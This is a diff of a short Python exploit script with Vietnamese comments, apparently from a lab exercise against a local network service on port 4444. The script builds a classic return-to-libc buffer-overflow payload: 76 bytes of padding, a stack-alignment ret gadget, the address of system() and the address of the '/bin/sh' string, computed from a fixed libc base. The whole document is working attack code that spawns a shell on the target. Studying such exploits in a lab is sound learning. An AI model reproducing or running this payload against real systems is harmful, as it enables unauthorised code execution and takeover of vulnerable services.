@@ -3,24 +3,30 @@ import struct
 import time
 import telnetlib
 
+#lay dia chi ip
 target_ip = "192.168.91.129"
+#port lang nghe
 target_port = 4444
 
+#tinh byte de ghi de (cong thuc 64 (buffer) + 8 (padding) + 4 (EBP) = 76$ byte)
 offset = 76
+
+#dia chi cua file lenh thuc thi sever.c ( kiem tra bang lenh ldd ./sever
 libc_base = 0xf7dca000
 
+#chay vao ham system() cua file libc.so.6
 system_addr = libc_base + 0x41360
 binsh_addr  = libc_base + 0x18c363
 
-# Ret gadget từ objdump của bạn (c3 ret thuần)
-ret_offset = 0x165f74  # thử cái này trước, nếu fail thử 0x165f84 hoặc 0x166019
+#dia chi cua ham ret()
+ret_offset = 0x165f74
 ret_gadget = libc_base + ret_offset
 
 payload = (
     b"A" * offset +
-    struct.pack("<I", ret_gadget) +      # ret để align stack (fix SSE crash trong system)
+    struct.pack("<I", ret_gadget) +
     struct.pack("<I", system_addr) +
-    struct.pack("<I", 0xdeadbeef) +      # fake ret (an toàn)
+    struct.pack("<I", 0xdeadbeef) +
     struct.pack("<I", binsh_addr)
 )
 
